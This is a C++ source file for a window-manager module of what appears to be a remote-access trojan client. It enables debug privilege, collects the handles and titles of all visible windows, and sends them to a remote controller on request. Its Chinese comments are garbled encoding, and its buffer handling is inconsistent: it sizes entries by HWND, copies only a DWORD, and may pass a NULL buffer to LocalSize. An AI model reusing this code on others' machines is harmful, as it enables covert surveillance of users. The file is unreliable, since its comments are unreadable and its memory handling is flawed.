#include "WindowManager.h"

CWindowManager::CWindowManager(_CIOCPClient* IOCPClient) : CManager(IOCPClient)
{
	printf("CCmdManager()����\r\n");
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	
	SendClientWindowList();
}

CWindowManager::~CWindowManager()
{
	printf("~CCmdManager()����\r\n");



	EnableSeDebugPrivilege(GetCurrentProcess(), FALSE, SE_DEBUG_NAME);
}

VOID CWindowManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_WINDOWS_MANAGER_REFRESH:
	{
		SendClientWindowList();
		break;
	}
	}


}

void CWindowManager::SendClientWindowList()
{
	//��ϵͳע��һ��ö�ٴ��ڵĺ���
	LPBYTE	BufferData = NULL; 
	//ö�ٴ����е����ж������ڣ������ǽ�������ݸ�ÿ�����ڣ�
	//Ȼ�󴫵ݸ�Ӧ�ó�����Ļص�����
	//EnumWindows������ֱ�����һ�����㴰��ö�ٻ�ص���������FALSE��
	EnumWindows((WNDENUMPROC)EnumWindowProcedure, (LPARAM)&BufferData); //��άָ��
	//ע�ắ��     �������(�ص�����) 																
	//���API�������������к���ָ����� 														
	//������ϵͳע��һ�� �ص�����
	if (BufferData!=NULL)
	{
		BufferData[0] = CLIENT_WINDOWS_MANAGER_REPLY;
	}
	m_IOCPClient->OnSending((char*)BufferData, LocalSize(BufferData));    
	//�����ض˷��͵õ��Ļ�����һ��ͷ�����
	LocalFree(BufferData);
}
//Ҫ���� ** [][][][][][][]    []
BOOL CALLBACK CWindowManager::EnumWindowProcedure(HWND Hwnd, LPARAM ParameterData)  
{
	DWORD	BufferLength = 0;
	DWORD	Offset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	BufferData = *(LPBYTE *)ParameterData;
	char	WindowTitleName[0x400] = { 0 };
	memset(WindowTitleName, 0, sizeof(WindowTitleName));
	//�õ�ϵͳ���ݽ����Ĵ��ھ���Ĵ��ڱ���
	GetWindowText(Hwnd, WindowTitleName, sizeof(WindowTitleName));
	//�����ж� �����Ƿ�ɼ� �����Ϊ��
	if (!IsWindowVisible(Hwnd) || lstrlen(WindowTitleName) == 0)
	{
		return TRUE;
	}
	
	//ͬ���̹���һ������ע�����ķ��͵����ض˵����ݽṹ
	if (BufferData == NULL)
	{
		BufferData = (LPBYTE)LocalAlloc(LPTR, 1);  //��ʱ���仺���� 
	}
	//[Flag][HWND][WindowTitleName]\0[HWND][WindowName]\0
	BufferLength = sizeof(HWND) + lstrlen(WindowTitleName) + 1;   //[Flag][dword][   \0]
	Offset = LocalSize(BufferData);  //1
	//���¼��㻺������С
	BufferData = (LPBYTE)LocalReAlloc(BufferData, Offset + BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
	//��������memcpy���ܿ������ݽṹΪ hwnd+���ڱ���+0
	memcpy((BufferData + Offset), &Hwnd, sizeof(DWORD));
	memcpy(BufferData + Offset + sizeof(DWORD), WindowTitleName, lstrlen(WindowTitleName) + 1);
	*(LPBYTE *)ParameterData = BufferData;
	return TRUE;
}

